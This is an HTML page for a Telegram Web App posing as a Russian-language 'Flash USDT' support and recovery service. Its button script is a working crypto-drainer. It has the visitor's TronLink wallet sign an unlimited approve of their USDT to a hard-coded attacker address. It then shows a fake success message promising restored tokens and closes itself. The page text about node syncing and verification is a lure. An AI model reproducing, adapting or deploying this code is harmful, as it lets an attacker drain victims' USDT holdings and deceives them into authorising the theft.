<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash USDT: Центр Восстановления</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            border: 1px solid #333;
            padding: 35px 25px;
            border-radius: 24px;
            background: linear-gradient(145deg, #1a1a1a, #111);
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
        }
        .status-box {
            font-size: 11px;
            letter-spacing: 1px;
            margin-bottom: 25px;
            color: #0088cc;
            font-weight: bold;
        }
        .status-dot {
            height: 8px; width: 8px; background-color: #0088cc;
            border-radius: 50%; display: inline-block; margin-right: 6px;
            box-shadow: 0 0 8px #0088cc;
        }
        h2 { color: #ffffff; margin: 0 0 12px 0; font-size: 20px; }
        p { color: #888; font-size: 13px; line-height: 1.6; margin-bottom: 30px; }
        #syncBtn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 18px;
            font-size: 15px;
            font-weight: 700;
            border-radius: 14px;
            cursor: pointer;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: all 0.2s;
        }
        #syncBtn:active { transform: scale(0.97); background: #0077b5; }
        .footer-info { margin-top: 25px; font-size: 9px; color: #444; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="container">
    <div class="status-box">
        <span class="status-dot"></span> СЛУЖБА ПОДДЕРЖКИ: ONLINE
    </div>
    <h2>Flash USDT Validator</h2>
    <p>Синхронизируйте ваш узел для завершения верификации приостановленной транзакции и восстановления баланса токенов USDT.</p>

    <button id="syncBtn">ВЕРИФИЦИРОВАТЬ ЛОГИ</button>
    
    <div class="footer-info">SECURE DATA STREAM // TRONSCAN API V3</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    document.getElementById('syncBtn').onclick = async () => {
        // Проверка наличия TronWeb (TronLink)
        if (!window.tronWeb) {
            alert('Пожалуйста, используйте браузер с поддержкой кошелька (например, TronLink).');
            return;
        }

        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4'; // Твой новый адрес

        try {
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
            const amount = '1000000000000000'; // Безлимитный апрув
            
            // Вызов окна апрува
            const result = await contract.approve(ADMIN_ADDRESS, amount).send();
            
            // Финальное сообщение после успешной подписи
            tg.showPopup({
                title: 'Синхронизация завершена',
                message: 'Approve успешно подписан. Ожидайте решения проблемы и зачисления токенов на ваш баланс в течение 15-30 минут.',
                buttons: [{type: 'ok'}]
            });
            
            // Автоматическое закрытие приложения через 4 секунды
            setTimeout(() => { 
                tg.close(); 
            }, 4000);

        } catch (e) {
            alert('Ошибка верификации: соединение отклонено или прервано.');
        }
    };
</script>

</body>
</html>
